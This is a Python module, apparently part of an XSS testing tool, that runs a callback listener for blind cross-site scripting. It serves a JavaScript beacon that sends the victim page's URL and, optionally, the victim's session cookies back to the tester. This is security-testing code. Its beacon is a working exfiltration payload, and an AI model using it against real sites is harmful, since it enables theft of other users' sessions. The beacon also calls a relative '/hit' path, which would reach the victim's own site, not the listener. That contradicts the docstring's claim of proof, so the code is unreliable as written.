"""Out-of-band callback listener for blind XSS.

Blind XSS is the case where the payload is stored on the target but rendered
somewhere the tester cannot see: an admin inbox, a moderation queue, a log
viewer. Reflection checks are useless there, because the page that executes the
payload is not the page that stored it.

The proof has to come from the payload itself calling home. This module is a
tiny HTTP listener that does exactly that:

* ``GET /b.js?m=<marker>`` serves a one-line beacon that immediately requests
  ``/hit?m=<marker>`` with the victim's URL, so a hit proves that a *browser on
  another page* executed script we planted.
* ``GET /hit?m=<marker>`` records the hit (marker, URL, user agent, time).

Session cookies are *not* collected unless ``--capture-cookies`` is passed: an
OOB hit already proves execution, and reading another user's session cookie is a
much bigger step than proving that script ran. When enabled, one cookie string
per hit is recorded and the report says so.

Only stdlib, binds to loopback by default, and every hit is timestamped so the
report can show ordering (planted at T0, executed at T1).
"""
from __future__ import annotations

import threading
import time
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

# %s, not str.format: the IIFE braces would be parsed as format fields.
BEACON_JS = (
    "(function(){var m=%s;var u=encodeURIComponent(location.href);"
    "var i=new Image();i.src='/hit?m='+m+'&u='+u+'&c='+encodeURIComponent(%s);})();"
)
COOKIE_EXPR = "document.cookie"
EMPTY_EXPR = "''"


class _Handler(BaseHTTPRequestHandler):
    server_version = "xssmap-callback"

    def log_message(self, fmt, *args):  # silence the default stderr chatter
        pass

    def _plain(self, code: int, body: bytes, ctype: str = "text/plain") -> None:
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        try:
            self.wfile.write(body)
        except Exception:
            pass

    def do_GET(self):
        parsed = urllib.parse.urlsplit(self.path)
        query = urllib.parse.parse_qs(parsed.query)
        marker = (query.get("m") or [""])[0][:120]
        listener: CallbackListener = self.server.listener  # type: ignore[attr-defined]

        if parsed.path.rstrip("/").endswith("b.js"):
            body = listener.beacon(marker).encode()
            listener.record(marker, self.path, self.headers.get("User-Agent", ""),
                            urllib.parse.unquote((query.get("u") or [""])[0]),
                            kind="script")
            self._plain(200, body, "application/javascript")
            return

        listener.record(marker, self.path, self.headers.get("User-Agent", ""),
                        urllib.parse.unquote((query.get("u") or [""])[0]),
                        kind="hit", cookie=(query.get("c") or [""])[0][:200])
        self._plain(200, b"ok")

    def do_POST(self):
        length = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(min(length, 65536)) if length else b""
        listener: CallbackListener = self.server.listener  # type: ignore[attr-defined]
        listener.record("", self.path, self.headers.get("User-Agent", ""),
                        body[:400].decode("utf-8", "replace"), kind="post")
        self._plain(200, b"ok")


class CallbackListener:
    """Loopback HTTP listener that records payload call-backs."""

    def __init__(self, host: str = "127.0.0.1", port: int = 0, log=None,
                 capture_cookies: bool = False, public_url: str = ""):
        self.host = host
        self.port = port
        self.log = log
        self.capture_cookies = capture_cookies
        # The address to embed in payloads can differ from the bind address
        # (tunnel, port-forward, container network). Empty means "use the
        # host:port the listener actually bound".
        self.public_url = (public_url or "").strip().rstrip("/")
        self.hits: list[dict] = []
        self._lock = threading.Lock()
        self._httpd: ThreadingHTTPServer | None = None
        self._thread: threading.Thread | None = None

    # -- lifecycle -----------------------------------------------------
    def start(self) -> CallbackListener:
        httpd = ThreadingHTTPServer((self.host, self.port), _Handler)
        httpd.daemon_threads = True
        httpd.listener = self  # type: ignore[attr-defined]
        self.port = httpd.server_address[1]
        self._httpd = httpd
        self._thread = threading.Thread(target=httpd.serve_forever, daemon=True,
                                        name="xssmap-callback")
        self._thread.start()
        return self

    def stop(self) -> None:
        if self._httpd is not None:
            try:
                self._httpd.shutdown()
                self._httpd.server_close()
            except Exception:
                pass
        self._httpd = None

    @property
    def url(self) -> str:
        if self.public_url:
            return self.public_url
        return f"http://{self.host}:{self.port}"

    def beacon(self, marker: str) -> str:
        """Beacon script for one marker; cookie capture is opt-in."""
        expr = COOKIE_EXPR if self.capture_cookies else EMPTY_EXPR
        return BEACON_JS % (repr(marker or ""), expr)

    # -- recording -----------------------------------------------------
    def record(self, marker: str, path: str, agent: str, victim_url: str,
               kind: str = "hit", cookie: str = "") -> None:
        entry = {"marker": marker, "path": path[:200], "agent": agent[:160],
                 "victim_url": victim_url[:300], "kind": kind,
                 "at": time.strftime("%H:%M:%S"), "cookie": cookie}
        with self._lock:
            self.hits.append(entry)
        if self.log is not None:
            try:
                self.log.ok(f"callback {kind}: marker {marker or '-'} from "
                            f"{victim_url or agent[:60] or 'unknown'}")
            except Exception:
                pass

    def seen(self, marker: str) -> list[dict]:
        with self._lock:
            return [h for h in self.hits if marker and h["marker"] == marker]

    def wait_for(self, marker: str, timeout: float = 6.0) -> dict | None:
        deadline = time.time() + timeout
        while time.time() < deadline:
            found = self.seen(marker)
            if found:
                return found[0]
            time.sleep(0.15)
        return None
